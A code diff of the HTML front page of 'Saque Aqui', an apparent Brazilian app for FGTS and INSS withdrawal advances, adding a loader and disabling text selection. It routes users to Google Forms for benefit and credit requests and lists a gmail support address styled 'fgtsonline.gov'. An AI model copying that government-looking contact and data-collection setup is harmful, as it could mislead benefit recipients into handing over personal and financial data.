@@ -41,6 +41,34 @@
       flex-direction: column;
     }
 
+    /* Estilo do Loader */
+    #loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .loader-spinner {
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid var(--primary);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     header {
       background-color: var(--primary);
       color: var(--text-dark);
@@ -236,7 +264,14 @@
       color: white;
     }
 
-    /* Exibir o botão de compartilhamento apenas em celulares */
+    /* Prevenção de Print Screen */
+    body {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
     @media (min-width: 768px) {
       .compartilhar-mobile {
         display: none !important;
@@ -246,109 +281,121 @@
 </head>
 <body data-tema="claro">
 
-<div id="popup" class="popup" style="display:none;">
-  <div class="popup-content">
-    <h3>Política de Privacidade</h3>
-    <p>Leia nossa <a href="https://www.saqueaqui.online/politica-de-privacidade-saque-fgts" target="_blank">política de privacidade</a> antes de continuar usando o aplicativo.</p>
-    <div class="popup-buttons">
-      <button class="accept" onclick="aceitarPolitica()">Aceitar</button>
-      <button class="decline" onclick="rejeitarPolitica()">Recusar</button>
+  <!-- Loader -->
+  <div id="loader" class="loader">
+    <div class="loader-spinner"></div>
+  </div>
+
+  <!-- Popup Política de Privacidade -->
+  <div id="popup" class="popup" style="display:none;">
+    <div class="popup-content">
+      <h3>Política de Privacidade</h3>
+      <p>Leia nossa <a href="https://www.saqueaqui.online/politica-de-privacidade-saque-fgts" target="_blank">política de privacidade</a> antes de continuar usando o aplicativo.</p>
+      <div class="popup-buttons">
+        <button class="accept" onclick="aceitarPolitica()">Aceitar</button>
+        <button class="decline" onclick="rejeitarPolitica()">Recusar</button>
+      </div>
     </div>
   </div>
-</div>
 
-<header>
-  <div class="top-bar">
-    <span><i class="fas fa-user"></i> Saque Aqui</span>
-    <div class="theme-toggle" onclick="alternarTema()" title="Alternar tema">
-      <i class="fas fa-moon" id="iconeTema"></i>
+  <!-- Cabeçalho -->
+  <header>
+    <div class="top-bar">
+      <span><i class="fas fa-user"></i> Saque Aqui</span>
+      <div class="theme-toggle" onclick="alternarTema()" title="Alternar tema">
+        <i class="fas fa-moon" id="iconeTema"></i>
+      </div>
     </div>
-  </div>
-  <div class="carousel">
-    <div class="carousel-track" id="carouselTrack">
-      <span>Saque FGTS</span>
-      <span>Saque INSS</span>
-      <span>Cartão de Crédito</span>
-      <span>Vídeo de Autorização</span>
-      <span>Bolsa Família</span>
-      <span>Compartilhe</span>
+    <div class="carousel">
+      <div class="carousel-track" id="carouselTrack">
+        <span>Saque FGTS</span>
+        <span>Saque INSS</span>
+        <span>Cartão de Crédito</span>
+        <span>Vídeo de Autorização</span>
+        <span>Bolsa Família</span>
+        <span>Compartilhe</span>
+      </div>
     </div>
+  </header>
+
+  <!-- Conteúdo -->
+  <div class="container">
+    <div class="destaque">
+      <strong>Falta pouco!</strong><br>
+      Verifique no seu aplicativo FGTS e autorize:<br>
+      <strong>1:</strong> J17 Sociedade de Crédito<br>
+      <strong>2:</strong> Giro Sociedade de Crédito
+    </div>
+
+    <div class="grid">
+      <a href="https://forms.gle/7Bs2DYANFbMaASEe9" class="card"><i class="fas fa-hand-holding-usd"></i><span>Saque FGTS</span></a>
+      <a href="https://forms.gle/4VguNYKX4KfBzVJN7" class="card"><i class="fas fa-university"></i><span>Saque INSS</span></a>
+      <a href="https://forms.gle/12yJmH5xCsZ9c2398" class="card"><i class="fas fa-credit-card"></i><span>Cartão Crédito</span></a>
+      <a href="https://www.saqueaqui.online/autoriza%C3%A7%C3%A3o-de-institui%C3%A7%C3%B5es-saque-fgts" class="card"><i class="fas fa-video"></i><span>Vídeo Autorização</span></a>
+      <a href="https://forms.gle/ZR54WYRQWpCkDo7t8" class="card"><i class="fas fa-users"></i><span>Bolsa Família</span></a>
+      <a href="https://api.whatsapp.com/send?text=Confira%20o%20app%20Saque%20Aqui!%20Rápido%20e%20fácil%20para%20adiantar%20seu%20FGTS.%20Baixe%20aqui:%20https://play.google.com/store/apps/details?id=com.sistema.br" class="card compartilhar-mobile" target="_blank"><i class="fas fa-share-alt"></i><span>Compartilhar App</span></a>
+    </div>
+
+    <div class="assistente-btn" onclick="abrirAssistente()">Assistente Virtual</div>
   </div>
-</header>
 
-<div class="container">
-  <div class="destaque">
-    <strong>Falta pouco!</strong><br>
-    Verifique no seu aplicativo FGTS e autorize:<br>
-    <strong>1:</strong> J17 Sociedade de Crédito<br>
-    <strong>2:</strong> Giro Sociedade de Crédito
+  <!-- Menu Inferior -->
+  <div class="menu-inferior">
+    <div onclick="location.reload()"><i class="fas fa-home"></i><div>Início</div></div>
+    <div onclick="window.open('https://www.saqueaqui.online/antecipa%C3%A7%C3%A3o-saque-aniversario-fgts-saque-aqui', '_blank')"><i class="fas fa-calendar"></i><div>Optar</div></div>
+    <div onclick="window.location.href='mailto:fgtsonline.gov@gmail.com'"><i class="fas fa-headset"></i><div>Suporte</div></div>
+    <div onclick="window.open('https://www.saqueaqui.online/saque-aniversario-do-fgts-saque-aqui', '_blank')"><i class="fas fa-globe"></i><div>Site</div></div>
   </div>
 
-  <div class="grid">
-    <a href="https://forms.gle/7Bs2DYANFbMaASEe9" class="card"><i class="fas fa-hand-holding-usd"></i><span>Saque FGTS</span></a>
-    <a href="https://forms.gle/4VguNYKX4KfBzVJN7" class="card"><i class="fas fa-university"></i><span>Saque INSS</span></a>
-    <a href="https://forms.gle/12yJmH5xCsZ9c2398" class="card"><i class="fas fa-credit-card"></i><span>Cartão Crédito</span></a>
-    <a href="https://www.saqueaqui.online/autoriza%C3%A7%C3%A3o-de-institui%C3%A7%C3%B5es-saque-fgts" class="card"><i class="fas fa-video"></i><span>Vídeo Autorização</span></a>
-    <a href="https://forms.gle/ZR54WYRQWpCkDo7t8" class="card"><i class="fas fa-users"></i><span>Bolsa Família</span></a>
-    <a href="https://api.whatsapp.com/send?text=Confira%20o%20app%20Saque%20Aqui!%20Rápido%20e%20fácil%20para%20adiantar%20seu%20FGTS.%20Baixe%20aqui:%20https://play.google.com/store/apps/details?id=com.sistema.br" class="card compartilhar-mobile" target="_blank"><i class="fas fa-share-alt"></i><span>Compartilhar App</span></a>
-  </div>
+  <script>
+    function abrirAssistente() {
+      alert("Para realizar seu saque:\n1. Autorize no app FGTS\n2. Autorize instituições J17 e Giro\n3. Clique em Saque FGTS.");
+    }
 
-  <div class="assistente-btn" onclick="abrirAssistente()">Assistente Virtual</div>
-</div>
+    function aceitarPolitica() {
+      document.getElementById('popup').style.display = 'none';
+      const agora = new Date().getTime();
+      localStorage.setItem('politicaAceita', agora);
+    }
 
-<div class="menu-inferior">
-  <div onclick="location.reload()"><i class="fas fa-home"></i><div>Início</div></div>
-  <div onclick="window.open('https://www.saqueaqui.online/antecipa%C3%A7%C3%A3o-saque-aniversario-fgts-saque-aqui', '_blank')"><i class="fas fa-calendar"></i><div>Optar</div></div>
-  <div onclick="window.location.href='mailto:fgtsonline.gov@gmail.com'"><i class="fas fa-headset"></i><div>Suporte</div></div>
-  <div onclick="window.open('https://www.saqueaqui.online/saque-aniversario-do-fgts-saque-aqui', '_blank')"><i class="fas fa-globe"></i><div>Site</div></div>
-</div>
+    function rejeitarPolitica() {
+      alert("Você precisa aceitar a política de privacidade para usar o app.");
+    }
 
-<script>
-function abrirAssistente() {
-  alert("Para realizar seu saque:\n1. Autorize no app FGTS\n2. Autorize instituições J17 e Giro\n3. Clique em Saque FGTS.");
-}
+    function alternarTema() {
+      const body = document.body;
+      const atual = body.getAttribute('data-tema');
+      const novo = atual === 'claro' ? 'escuro' : 'claro';
+      body.setAttribute('data-tema', novo);
+      document.getElementById('iconeTema').className = novo === 'escuro' ? 'fas fa-sun' : 'fas fa-moon';
+    }
 
-function aceitarPolitica() {
-  document.getElementById('popup').style.display = 'none';
-  const agora = new Date().getTime();
-  localStorage.setItem('politicaAceita', agora);
-}
+    let scroll = 0;
+    function animarCarrossel() {
+      const track = document.getElementById('carouselTrack');
+      if (track) {
+        scroll += 0.5;
+        if (scroll >= track.scrollWidth) scroll = 0;
+        track.style.transform = `translateX(-${scroll}px)`;
+        requestAnimationFrame(animarCarrossel);
+      }
+    }
 
-function rejeitarPolitica() {
-  alert("Você precisa aceitar a política de privacidade para usar o app.");
-}
+    window.onload = () => {
+      // Ocultar o loader após o carregamento
+      document.getElementById('loader').style.display = 'none';
 
-function alternarTema() {
-  const body = document.body;
-  const atual = body.getAttribute('data-tema');
-  const novo = atual === 'claro' ? 'escuro' : 'claro';
-  body.setAttribute('data-tema', novo);
-  document.getElementById('iconeTema').className = novo === 'escuro' ? 'fas fa-sun' : 'fas fa-moon';
-}
+      const politicaAceita = localStorage.getItem('politicaAceita');
+      const agora = new Date().getTime();
+      const umDia = 24 * 60 * 60 * 1000;
 
-let scroll = 0;
-function animarCarrossel() {
-  const track = document.getElementById('carouselTrack');
-  if (track) {
-    scroll += 0.5;
-    if (scroll >= track.scrollWidth) scroll = 0;
-    track.style.transform = `translateX(-${scroll}px)`;
-    requestAnimationFrame(animarCarrossel);
-  }
-}
+      if (!politicaAceita || (agora - politicaAceita) > umDia) {
+        document.getElementById('popup').style.display = 'flex';
+      }
 
-window.onload = () => {
-  const politicaAceita = localStorage.getItem('politicaAceita');
-  const agora = new Date().getTime();
-  const umDia = 24 * 60 * 60 * 1000;
-
-  if (!politicaAceita || (agora - politicaAceita) > umDia) {
-    document.getElementById('popup').style.display = 'flex';
-  }
-
-  animarCarrossel();
-};
-</script>
+      animarCarrossel();
+    };
+  </script>
 
 </body>
-  </html>
+</html>
